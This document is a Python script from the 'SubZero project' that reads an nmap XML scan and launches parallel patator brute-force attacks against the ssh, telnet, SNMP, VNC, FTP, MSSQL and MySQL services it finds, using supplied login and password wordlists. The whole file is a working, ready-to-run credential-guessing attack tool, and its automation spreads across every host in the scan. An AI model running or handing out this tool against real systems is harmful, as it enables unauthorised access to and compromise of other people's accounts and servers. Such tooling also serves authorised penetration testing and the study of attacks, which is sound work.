#!/usr/bin/python3

"""
Part of SubZero project: 
Written by David SORIA (Sibwara, dsoria@astar.org) in 2019
Do not sell in a commercial package
"""

import argparse
import subprocess
import os.path
import xml.etree.ElementTree as ET
from threading import Thread, RLock

PROGRESS = 0
ALL = ("ssh", "snmp", "vnc", "mysql", "mssql", "telnet", "ftp")
TOTAL = 0
lock = RLock()

class Patator(Thread):

    def __init__(self, ip, port, proto, path, logins, passwords):
        Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.proto = proto
        self.path = path
        self.logins = logins
        self.passwords= passwords

    def run(self):
        if self.proto in ("ssh", "all"):
            self.ssh_login()
        if self.proto in ("telnet", "all"):
            self.telnet_login()
        if self.proto in ("snmp", "all"):
            self.snmp_login()
        if self.proto in ("mssql", "all"):
            self.mssql_login()
        if self.proto in ("ftp", "all"):
            self.ftp_login()
        if self.proto in ("vnc", "all"):
            self.vnc_login()
        if self.proto in ("mysql", "all"):
            self.mysql_login()


        with lock:
            global PROGRESS
            global TOTAL
            PROGRESS += 1
            print(f"[+] {self.ip}:{self.port} brute finished")
            print(f"[*] Progress: {PROGRESS}/{TOTAL}")

    def snmp_login(self):
        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
                        f"host={self.ip}", "community=FILE0", f"0={self.passwords}",
                        "version=2", f"--csv={self.path}/{self.proto}-{self.ip}-{self.port}" ],
                        capture_output=True)

        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
                        f"host={self.ip}", "user=FILE0", f"0={self.logins}", "auth_key=FILE1",
                        f"1={self.passwords}", "version=3", 
                        f"--csv={self.path}/{self.proto}3-{self.ip}-{self.port}" ],
                        capture_output=True)

    def ssh_login(self):
        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
                        f"host={self.ip}", "user=FILE0", "password=FILE1", f"0={self.logins}",
                        f"1={self.passwords}", f"--csv={self.path}/{self.proto}-{self.ip}-{self.port}" ],
                        capture_output=True)

    def telnet_login(self):
        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
            f"host={self.ip}", "inputs='FILE0\nFILE1'", "prompt_re='Username:|Password:'", 
            f"0={self.logins}", f"1={self.passwords}", 
            f"--csv={self.path}/{self.proto}-{self.ip}-{self.port}" ], capture_output=True)

    def vnc_login(self):
        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
            f"host={self.ip}", "password=FILE0", f"0={self.passwords}", 
            f"--csv={self.path}/{self.proto}-{self.ip}-{self.port}" ], capture_output=True)

    def ftp_login(self):
        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
            f"host={self.ip}", "user=FILE0", "password=FILE1", f"0={self.logins}", f"1={self.passwords}", 
            f"--csv={self.path}/{self.proto}-{self.ip}-{self.port}" ], capture_output=True)

    def mssql_login(self):
        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
            f"host={self.ip}", "user=FILE0", "password=FILE1", f"0={self.logins}", f"1={self.passwords}", 
            f"--csv={self.path}/{self.proto}-{self.ip}-{self.port}" ], capture_output=True)
    
    def mysql_login(self):
        result = subprocess.run(['patator', f"{self.proto}_login", f"port={self.port}",
            f"host={self.ip}", "user=FILE0", "password=FILE1", f"0={self.logins}", f"1={self.passwords}", 
            f"--csv={self.path}/{self.proto}-{self.ip}-{self.port}" ], capture_output=True)



def find_target(nmap, proto):
    print("[*] Parsing the NMAP file ...")
    global ALL
    if proto == "all":
        proto = ALL
    target = {}
    r = nmap.getroot()
    # for each host
    for host in r.iter("host"):
        # who is alive
        if host.find("status").attrib["state"] == "up":
            # get the IPv4 address
            for a in host.iter("address"):
                if a.get("addrtype") == "ipv4":
                    ip = a.get("addr")
                    # first time we see this IP
                    if ip not in target:
                        target[ip] = {}
                    for p in host.find("ports").iter('port'):
                        sname = p.find("service").get("name")
                        if sname in proto:
                            if sname not in target[ip]:
                                target[ip][sname] = set()
                            target[ip][sname].add(p.get("portid"))
                    if len(target[ip]) == 0:
                        del(target[ip])
    print("[+] Parsing sucessfull")
    return target

def brute(target, path, logins, passwords):
    global TOTAL
    TOTAL = len(target)
    print(f"[*] {TOTAL} targets to proceed")
    for t in target:
        print(t,target[t])

    threads = []
    # for each host
    for ip in target:
        # for each protocol of the host
        for proto in target[ip]:
            # for each ports for this protocol
            for port in target[ip][proto]:
                # brute
                print(f"[*] Brute {ip}:{port} ...")
                threads.append(Patator(ip, port, proto, path, logins, passwords))   
    for t in threads:
        t.start()
    for t2 in threads:
        t2.join()

def main():
    parser = argparse.ArgumentParser(description='Spread patator over a nmap '\
            'result to bruteforce services', add_help=True)
    parser.add_argument('-w', action="store", dest="path", default='.', 
            help='A path to store the results. Default is current folder')
    parser.add_argument('NMAP_XML_FILE', action="store",  
            help='A nmap result file in xml format')
    parser.add_argument('-L', action="store", dest="logins",
            help="A logins wordlist")
    parser.add_argument('-P', action="store", dest="passwords",
            help="A passwords wordlist")  
    parser.add_argument('-s', action="store", dest="service", 
            help="The service to attack. Default is all. Possible are snmp,ssh,telnet,ftp,vnc,mssql", default="all")   
    args = parser.parse_args()
    if not os.path.isdir(args.path):
        print('[!] Given path does not exist, creating it...')
        os.mkdir(args.path)

    nmap = ET.parse(args.NMAP_XML_FILE)
    brute( find_target(nmap, args.service), args.path, args.logins, args.passwords )

if __name__ == '__main__':
    main()
